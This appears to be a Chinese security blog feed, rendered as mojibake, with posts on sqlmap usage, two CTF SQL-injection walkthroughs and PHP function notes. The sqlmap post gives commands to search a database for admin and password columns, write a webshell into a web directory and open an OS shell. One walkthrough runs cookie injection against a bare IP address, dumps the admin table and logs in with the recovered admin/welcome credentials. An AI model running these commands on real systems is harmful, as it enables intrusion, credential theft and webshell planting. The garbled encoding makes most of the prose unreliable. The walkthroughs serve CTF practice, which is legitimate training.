æŒ‡å®šç›®æ ‡ç«™ç‚¹D:/www/ è¾“å…¥ipconfig/all åˆ›å»ºç”¨æˆ·å’Œåˆ é™¤ç”¨æˆ· åªè¦æƒé™è¶³å¤Ÿå¤§ï¼Œä½ å¯ä»¥è¾“å…¥ä½¿ç”¨ä»»ä½•å‘½ä»¤ã€‚ å…¶ä»–å‘½ä»¤å‚è€ƒä¸‹é¢ï¼š ä»æ•°æ®åº“ä¸­æœç´¢å­—æ®µ 1sqlmap -r â€œc:\tools\request.txtâ€ â€“dbms mysql -D dedecms â€“search -C admin,password åœ¨dedecmsæ•°æ®åº“ä¸­æœç´¢å­—æ®µadminæˆ–è€…passwordã€‚ è¯»å–ä¸å†™å…¥æ–‡ä»¶ é¦–å…ˆæ‰¾éœ€è¦ç½‘ç«™çš„ç‰©ç†è·¯å¾„ï¼Œå…¶æ¬¡éœ€è¦æœ‰å¯å†™æˆ–å¯è¯»æƒé™ã€‚ â€“file-read=RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶ ï¼ˆç‰©ç†è·¯å¾„ï¼‰ â€“file-write=WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶ ï¼ˆmssql xp_shellï¼‰ â€“file-dest=DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ #ç¤ºä¾‹ï¼š 1sqlmap -r â€œc:\request.txtâ€ -p id â€“dbms mysql â€“file-dest â€œe:\php\htdocs\dvwa\inc\include\1.phpâ€ â€“file-write â€œf:\webshell\1112.phpâ€ ä½¿ç”¨shellå‘½ä»¤ï¼š 1sqlmap -r â€œc:\tools\request.txtâ€ -p id â€“dms mysql â€“os-shell æ¥ä¸‹æ¥æŒ‡å®šç½‘ç«™å¯å†™ç›®å½•ï¼š â€œE:\php\htdocs\dvwaâ€ #æ³¨ï¼šmysqlä¸æ”¯æŒåˆ—ç›®å½•ï¼Œä»…æ”¯æŒè¯»å–å•ä¸ªæ–‡ä»¶ã€‚sqlserverå¯ä»¥åˆ—ç›®å½•ï¼Œä¸èƒ½è¯»å†™æ–‡ä»¶ï¼Œä½†éœ€è¦ä¸€ä¸ªï¼ˆxp_dirtreeå‡½æ•°ï¼‰ sqlmapè¯¦ç»†å‘½ä»¤ï¼š -is-dba å½“å‰ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ä¸ºrootæƒé™ï¼‰ -dbs æ‰€æœ‰æ•°æ®åº“ -current-db ç½‘ç«™å½“å‰æ•°æ®åº“ -users æ‰€æœ‰æ•°æ®åº“ç”¨æˆ· -current-user å½“å‰æ•°æ®åº“ç”¨æˆ· -random-agent æ„é€ éšæœºuser-agent -passwords æ•°æ®åº“å¯†ç  -proxy http://local:8080 â€“threads 10 (å¯ä»¥è‡ªå®šä¹‰çº¿ç¨‹åŠ é€Ÿ) ä»£ç† -time-sec=TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰ Optionsï¼ˆé€‰é¡¹ï¼‰ï¼š-version æ˜¾ç¤ºç¨‹åºçš„ç‰ˆæœ¬å·å¹¶é€€å‡º-h, â€“help æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º-v VERBOSE è¯¦ç»†çº§åˆ«ï¼š0-6ï¼ˆé»˜è®¤ä¸º1ï¼‰ Targetï¼ˆç›®æ ‡ï¼‰ï¼š ä»¥ä¸‹è‡³å°‘éœ€è¦è®¾ç½®å…¶ä¸­ä¸€ä¸ªé€‰é¡¹ï¼Œè®¾ç½®ç›®æ ‡URLã€‚ -d DIRECT ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“ã€‚-u URL, â€“url=URL ç›®æ ‡URLã€‚-l LIST ä»Burpæˆ–WebScarabä»£ç†çš„æ—¥å¿—ä¸­è§£æç›®æ ‡ã€‚-r REQUESTFILE ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è½½å…¥HTTPè¯·æ±‚ã€‚-g GOOGLEDORK å¤„ç†Google dorkçš„ç»“æœä½œä¸ºç›®æ ‡URLã€‚-c CONFIGFILE ä»INIé…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ã€‚ Requestï¼ˆè¯·æ±‚ï¼‰ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URLã€‚ -data=DATA é€šè¿‡POSTå‘é€çš„æ•°æ®å­—ç¬¦ä¸²-cookie=COOKIE HTTP Cookieå¤´-cookie-urlencode URL ç¼–ç ç”Ÿæˆçš„cookieæ³¨å…¥-drop-set-cookie å¿½ç•¥å“åº”çš„Set â€“ Cookieå¤´ä¿¡æ¯-user-agent=AGENT æŒ‡å®š HTTP User â€“ Agentå¤´-random-agent ä½¿ç”¨éšæœºé€‰å®šçš„HTTP User â€“ Agentå¤´-referer=REFERER æŒ‡å®š HTTP Refererå¤´-headers=HEADERS æ¢è¡Œåˆ†å¼€ï¼ŒåŠ å…¥å…¶ä»–çš„HTTPå¤´-auth-type=ATYPE HTTPèº«ä»½éªŒè¯ç±»å‹ï¼ˆåŸºæœ¬ï¼Œæ‘˜è¦æˆ–NTLMï¼‰(Basic, Digest or NTLM)-auth-cred=ACRED HTTPèº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·å:å¯†ç ï¼‰-auth-cert=ACERT HTTPè®¤è¯è¯ä¹¦ï¼ˆkey_fileï¼Œcert_fileï¼‰-proxy=PROXY ä½¿ç”¨HTTPä»£ç†è¿æ¥åˆ°ç›®æ ‡URL-proxy-cred=PCRED HTTPä»£ç†èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰-ignore-proxy å¿½ç•¥ç³»ç»Ÿé»˜è®¤çš„HTTPä»£ç†-delay=DELAY åœ¨æ¯ä¸ªHTTPè¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½ä¸ºç§’-timeout=TIMEOUT ç­‰å¾…è¿æ¥è¶…æ—¶çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º30ç§’ï¼‰-retries=RETRIES è¿æ¥è¶…æ—¶åé‡æ–°è¿æ¥çš„æ—¶é—´ï¼ˆé»˜è®¤3ï¼‰-scope=SCOPE ä»æ‰€æä¾›çš„ä»£ç†æ—¥å¿—ä¸­è¿‡æ»¤å™¨ç›®æ ‡çš„æ­£åˆ™è¡¨è¾¾å¼-safe-url=SAFURL åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸è®¿é—®çš„urlåœ°å€-safe-freq=SAFREQ ä¸¤æ¬¡è®¿é—®ä¹‹é—´æµ‹è¯•è¯·æ±‚ï¼Œç»™å‡ºå®‰å…¨çš„URL Enumerationï¼ˆæšä¸¾ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ—ä¸¾åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¿¡æ¯ã€è¡¨ä¸­çš„ç»“æ„å’Œæ•°æ®ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥è¿è¡Œæ‚¨è‡ªå·±çš„SQLè¯­å¥ã€‚ -b, â€“banner æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†-current-user æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·-current-db æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“-is-dba æ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBA-users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·-passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ-privileges æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™-roles æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²-dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“-D DBname è¦è¿›è¡Œæšä¸¾çš„æŒ‡å®šæ•°æ®åº“å-T TBLname è¦è¿›è¡Œæšä¸¾çš„æŒ‡å®šæ•°æ®åº“è¡¨ï¼ˆå¦‚ï¼š-T tablename â€“columnsï¼‰-tables æšä¸¾çš„DBMSæ•°æ®åº“ä¸­çš„è¡¨-columns æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—-dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹-dump-all è½¬å‚¨æ‰€æœ‰çš„DBMSæ•°æ®åº“è¡¨ä¸­çš„æ¡ç›®-search æœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ/æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰-C COL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ—-U USER ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·-exclude-sysdbs æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“-start=LIMITSTART ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿›å…¥æ£€ç´¢-stop=LIMITSTOP æœ€åæŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥æ£€ç´¢-first=FIRSTCHAR ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦æ£€ç´¢-last=LASTCHAR æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦æ£€ç´¢-sql-query=QUERY è¦æ‰§è¡Œçš„SQLè¯­å¥-sql-shell æç¤ºäº¤äº’å¼SQLçš„shell Optimizationï¼ˆä¼˜åŒ–ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ç”¨äºä¼˜åŒ–SqlMapçš„æ€§èƒ½ã€‚ -o å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³â€“predict-output é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡ºâ€“keep-alive ä½¿ç”¨æŒä¹…çš„HTTPï¼ˆSï¼‰è¿æ¥â€“null-connection ä»æ²¡æœ‰å®é™…çš„HTTPå“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦â€“threads=THREADS æœ€å¤§çš„HTTPï¼ˆSï¼‰è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º1ï¼‰ Injectionï¼ˆæ³¨å…¥ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œ æä¾›è‡ªå®šä¹‰çš„æ³¨å…¥payloadså’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚ -p TESTPARAMETER å¯æµ‹è¯•çš„å‚æ•°ï¼ˆSï¼‰â€“dbms=DBMS å¼ºåˆ¶åç«¯çš„DBMSä¸ºæ­¤å€¼â€“os=OS å¼ºåˆ¶åç«¯çš„DBMSæ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼â€“prefix=PREFIX æ³¨å…¥payloadå­—ç¬¦ä¸²å‰ç¼€â€“suffix=SUFFIX æ³¨å…¥payloadå­—ç¬¦ä¸²åç¼€â€“tamper=TAMPER ä½¿ç”¨ç»™å®šçš„è„šæœ¬ï¼ˆSï¼‰ç¯¡æ”¹æ³¨å…¥æ•°æ® Detectionï¼ˆæ£€æµ‹ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šåœ¨SQLç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒHTTPå“åº”é¡µé¢çš„å†…å®¹ã€‚ â€“level=LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰â€“risk=RISK æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰â€“string=STRING æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸²â€“regexp=REGEXP æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼â€“text-only ä»…åŸºäºåœ¨æ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µ Techniquesï¼ˆæŠ€å·§ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ç”¨äºè°ƒæ•´å…·ä½“çš„SQLæ³¨å…¥æµ‹è¯•ã€‚ â€“technique=TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤BEUSTï¼‰â€“time-sec=TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰â€“union-cols=UCOLS å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯•UNIONæŸ¥è¯¢æ³¨å…¥â€“union-char=UCHAR ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦ Fingerprintï¼ˆæŒ‡çº¹ï¼‰ï¼š-f, â€“fingerprint æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„DBMSç‰ˆæœ¬æŒ‡çº¹ Brute forceï¼ˆè›®åŠ›ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥ã€‚ â€“common-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨ â€“common-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ— User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚ â€“udf-inject æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° â€“shared-lib=SHLIB å…±äº«åº“çš„æœ¬åœ°è·¯å¾„ File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚ â€“file-read=RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶â€“file-write=WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶â€“file-dest=DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨äºè®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ“ä½œç³»ç»Ÿã€‚ â€“os-cmd=OSCMD æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤â€“os-shell äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿçš„shellâ€“os-pwn è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNCâ€“os-smbrelay ä¸€é”®è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNCâ€“os-bof å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨â€“priv-esc æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·æƒé™æå‡â€“msf-path=MSFPATH Metasploit Frameworkæœ¬åœ°çš„å®‰è£…è·¯å¾„â€“tmp-path=TMPPATH è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„ Windowsæ³¨å†Œè¡¨è®¿é—®ï¼šè¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»ŸWindowsæ³¨å†Œè¡¨ã€‚ â€“reg-read è¯»ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼â€“reg-add å†™ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼æ•°æ®â€“reg-del åˆ é™¤Windowsæ³¨å†Œè¡¨é”®å€¼â€“reg-key=REGKEY Windowsæ³¨å†Œè¡¨é”®â€“reg-value=REGVAL Windowsæ³¨å†Œè¡¨é¡¹å€¼â€“reg-data=REGDATA Windowsæ³¨å†Œè¡¨é”®å€¼æ•°æ®â€“reg-type=REGTYPE Windowsæ³¨å†Œè¡¨é¡¹å€¼ç±»å‹è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€äº›ä¸€èˆ¬çš„å·¥ä½œå‚æ•°ã€‚-t TRAFFICFILE è®°å½•æ‰€æœ‰HTTPæµé‡åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­-s SESSIONFILE ä¿å­˜å’Œæ¢å¤æ£€ç´¢ä¼šè¯æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®â€“flush-session åˆ·æ–°å½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶â€“fresh-queries å¿½ç•¥åœ¨ä¼šè¯æ–‡ä»¶ä¸­å­˜å‚¨çš„æŸ¥è¯¢ç»“æœâ€“eta æ˜¾ç¤ºæ¯ä¸ªè¾“å‡ºçš„é¢„è®¡åˆ°è¾¾æ—¶é—´â€“update æ›´æ–°SqlMapâ€“save fileä¿å­˜é€‰é¡¹åˆ°INIé…ç½®æ–‡ä»¶â€“batch ä»ä¸è¯¢é—®ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨æ‰€æœ‰é»˜è®¤é…ç½®ã€‚ Miscellaneousï¼ˆæ‚é¡¹ï¼‰ï¼šâ€“beep å‘ç°SQLæ³¨å…¥æ—¶æé†’â€“check-payload IDSå¯¹æ³¨å…¥payloadsçš„æ£€æµ‹æµ‹è¯•â€“cleanup SqlMapå…·ä½“çš„UDFå’Œè¡¨æ¸…ç†DBMSâ€“forms å¯¹ç›®æ ‡URLçš„è§£æå’Œæµ‹è¯•å½¢å¼â€“gpage=GOOGLEPAGE ä»æŒ‡å®šçš„é¡µç ä½¿ç”¨è°·æ­Œdorkç»“æœâ€“page-rank Google dorkç»“æœæ˜¾ç¤ºç½‘é¡µæ’åï¼ˆPRï¼‰â€“parse-errors ä»å“åº”é¡µé¢è§£ææ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„é”™è¯¯æ¶ˆæ¯â€“replicate å¤åˆ¶è½¬å‚¨çš„æ•°æ®åˆ°ä¸€ä¸ªsqlite3æ•°æ®åº“â€“tor ä½¿ç”¨é»˜è®¤çš„Torï¼ˆVidalia/ Privoxy/ Polipoï¼‰ä»£ç†åœ°å€â€“wizard ç»™åˆçº§ç”¨æˆ·çš„ç®€å•å‘å¯¼ç•Œé¢ ç›¸å…³é“¾æ¥ï¼šhttp://bbs.ichunqiu.com/thread-10583-1-1.html]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmapä¹‹cookieæ³¨å…¥ï¼ˆé¶åœºç¬¬äºŒé¢˜ï¼‰]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap1%2F</url>
    <content type="text"><![CDATA[sqlmapé¶åœºç¬¬äºŒé¢˜ï¼šhttps://hack.zkaq.org/?a=battle&amp;f=target&amp;id=31ac789a52edf9bbé¦–å…ˆæˆ‘ä»¬å°è¯•ä¸‹sqlæ³¨å…¥ http://120.203.13.75:8001/shownews.asp?id=171%20and%201=1 è¯´æ˜è¯¥ç½‘ç«™æœ‰é˜²sqlæ³¨å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨cookieæ³¨å…¥ http://120.203.13.75:8001/shownews.asp?id=171%20order%20by%2010 ç¬¬ä¸€æ­¥çŒœè§£è¡¨ sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --table --level 2 ç¬¬äºŒæ­¥ï¼ŒçŒœå­—æ®µ sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --column -T admin --level 2 ç¬¬ä¸‰æ­¥ï¼Œçˆ†æ•°æ® sqlmap -u &quot;http://120.203.13.75:8001/shownews.asp?&quot; --cookie &quot;id=171&quot; --dump -T admin -C &quot;username,password&quot; --level 2 b9a2a2b5dffb918c,è¯¥å¯†ç æ˜¯md5åŠ å¯†ï¼Œç™¾åº¦æœç´¢md5åœ¨çº¿åŠ å¯†æˆ‘ä»¬å·²ç»æ‹¿åˆ°å¯†ç äº†è¿›å…¥åå°ç½‘ç«™,åˆ©ç”¨å¾¡å‰‘å·¥ä½œæ‰«å‡ºåå°http://120.203.13.75:8001/adminè¾“å…¥è´¦å·admin,å¯†ç welcomeè·å–flag]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmapå®‰è£…ä¸ä½¿ç”¨ï¼ˆå®éªŒå§ç¬¬3é¢˜ï¼‰]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap0%2F</url>
    <content type="text"><![CDATA[ä½¿ç”¨çš„ç¯å¢ƒæ˜¯Ubuntuç³»ç»Ÿ sqlmapçš„å®‰è£…sqlmapéœ€è¦å®‰è£…python2ç¯å¢ƒ,python3ä¸è¡Œ(Ubuntuä¸‹é»˜è®¤å®‰è£…python2)è¾“å…¥å‘½ä»¤ï¼šsudo apt sqlampæ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸè¾“å…¥å‘½ä»¤ï¼šsqlmap -helpè¿”å›ä¸‹é¢ç»“æœå³ä¸ºæˆåŠŸã€‚ sqlmapåŸºæœ¬å‚æ•°sqlmap -h æŸ¥çœ‹å¸®åŠ©é€‰é¡¹is -dba å½“å‰ç”¨æˆ·æƒé™dbs æ‰€æœ‰æ•°æ®åº“current-db ç½‘ç«™å½“å‰æ•°æ®åº“users æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·current-user å½“å‰æ•°æ®åº“ç”¨æˆ·tables å‚æ•°ï¼šåˆ—è¡¨åcolumns å‚æ•°ï¼šå­—æ®µådump å‚æ•°ï¼šä¸‹è½½æ•°æ® sqlmapç‰›åˆ€å°è¯•æˆ‘ä»¬ä»¥è¿™åˆ°é¢˜ä¸ºä¾‹http://www.shiyanbar.com/ctf/33ã€‚å¦‚æœæ²¡æœ‰æ³¨å†Œè¿‡å®éªŒå§çš„æœ‹å‹å…ˆæ³¨å†Œä¸‹å®éªŒå§æ‹¿åˆ°é¢˜ç›®æˆ‘ä»¬åˆ¤æ–­ä¸‹æœ‰æ²¡æœ‰sqlæ³¨å…¥ åœ¨urlåé¢åŠ ä¸Šand 1=1,æ²¡æœ‰æŠ¥é”™ åŠ ä¸Šand 1=2ï¼ŒæŠ¥é”™ã€‚ è¯´æ˜æœ‰sqlæ³¨å…¥ ç¬¬ä¸€æ­¥ä½¿ç”¨sqlmapæŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯è¾“å…¥å‘½ä»¤ï¼šsqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; --current-dbç»è¿‡ä¸€äº›æ—¶é—´æˆåŠŸçˆ†å‡ºå½“å‰æ•°æ®åº“ä¸ºmy_db,å¦‚æœæ³¨å…¥è¿‡ç¨‹æç¤ºé€‰æ‹©yæˆ–è€…nï¼Œä¸€èˆ¬æ˜¯é€‰æ‹©yã€‚å¤§æ¦‚å°±æ˜¯å°è¯•æ›´å¤šçš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ç¬¬äºŒæ­¥ã€çˆ†å‡ºè¡¨åè¾“å…¥å‘½ä»¤ï¼šsqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db --tables ç¬¬ä¸‰æ­¥çˆ†å­—æ®µåè¾“å…¥å‘½ä»¤ï¼š sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey --columnsy ç¬¬å››æ­¥ã€çˆ†æ•°æ®è¾“å…¥å‘½ä»¤ï¼š sqlmap -u &quot;http://ctf5.shiyanbar.com/8/index.php?id=1&quot; -D my_db -T thiskey -C k0y --dump ç¨ç­‰ç‰‡åˆ»ï¼ŒæˆåŠŸæ‰¾åˆ°flagï¼šwhatiMyD91dump]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP strcmpï¼ˆï¼‰å‡½æ•° å¼•å…¥æ–‡ä»¶è¯­å¥çš„åŒºåˆ« é­”æœ¯æ–¹æ³•]]></title>
    <url>%2F2019%2F02%2F28%2FPHP1%2F</url>
    <content type="text"><![CDATA[ä¸€ã€strcmpï¼ˆï¼‰å‡½æ•°1ã€strcmpï¼ˆï¼‰çš„ä½œç”¨æ˜¯æ¯”è¾ƒ2ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰2ã€åŸºæœ¬è¯­æ³•ï¼š stcmp(string1,string2)//string1å’Œ2è¿›è¡Œæ¯”è¾ƒ 3ã€æŠ€æœ¯ç»†èŠ‚ï¼šå¦‚æœè¿”å›å€¼ä¸º0,2ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰å¦‚æœè¿”å›å€¼å°äº0,string1å°äºstring2å¦‚æœè¿”å›å€¼å¤§äº0,string1å¤§äºstring2æ³¨æ„çš„æ˜¯ï¼ŒPHPç‰ˆæœ¬å¾—ä¸º4+ è¯¥å‡½æ•°ä¸stncmop()å‡½æ•°ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œstncmop()å‡½æ•°å¯ä»¥æŒ‡å®šå­—ç¬¦ä¸²ç”¨äºæ¯”è¾ƒçš„å­—ç¬¦æ•°åŸºæœ¬è¯­æ³•ï¼š strncmp(string1,string2,length) äºŒã€include() ã€require()è¯­å¥åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚è¿™ä¸¤ç»“æ„åœ¨åŒ…å«æ–‡ä»¶ä¸Šå®Œå…¨ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯å¯¹äºé”™è¯¯çš„å¤„ç†ã€‚require()è¯­å¥åœ¨é‡åˆ°åŒ…å«æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæˆ–æ˜¯å‡ºé”™çš„æ—¶å€™ï¼Œå°±åœæ­¢å³è¡Œï¼Œå¹¶æŠ¥é”™ã€‚include()åˆ™ç»§ç»­å³è¡Œã€‚ include(â€˜hello.phpâ€™); echo â€˜include test final!â€™;//includeæŠ¥é”™ï¼Œä½†æ˜¯ä¼šç»§ç»­æ‰§è¡Œï¼Œæ˜¾ç¤ºï¼šinclude test final! require(â€˜hello.phpâ€™); echo â€˜require test final!â€™;//requireæŠ¥é”™ï¼Œåœæ­¢ä»£ç çš„æ‰§è¡Œã€‚ äºŒã€include, include_once, require, require_once çš„åŒºåˆ«include å’Œ include_once åªæœ‰åœ¨ php æ‰§è¡Œåˆ°è¯¥è¯­å¥æ—¶æ‰ä¼šæ‰§è¡Œæ–‡ä»¶åŒ…å«çš„æ“ä½œã€‚å…¶ä¸­ï¼Œincludeåœ¨åŒ…å«æ–‡ä»¶å‡ºé”™æ—¶ä¼šæç¤º warning, ä½†åç»­çš„ä»£ç ä»ä¼šç»§ç»­æ‰§è¡Œ, iclude_once ä¸ä¼šé‡å¤åŒ…å«åŒä¸€æ–‡ä»¶;require å’Œ require_once åœ¨phpæ–‡ä»¶æ‰§è¡Œå‰å°±æŠŠéœ€è¦åŒ…å«çš„æ–‡ä»¶çš„å†…å®¹æ›¿æ¢æ‰ require è¯­å¥æœ¬èº«, æ‰€ä»¥åœ¨åŒ…å«æ–‡ä»¶å‡ºé”™æ—¶ä¼šæŠ›å‡ºerror, åç»­ä»£ç ä¸ä¼šç»§ç»­æ‰§è¡Œ, require_once ä¹Ÿåªæ‰§è¡Œä¸€æ¬¡åŒ…å«æ“ä½œ.ä¸‹é¢è¿™ç¯‡åšå®¢æ˜¯æ•™è¯¦ç»†ä»‹ç»äº†ä»–ä»¬Â·çš„åŒºåˆ«https://blog.csdn.net/j393819650/article/details/53836525 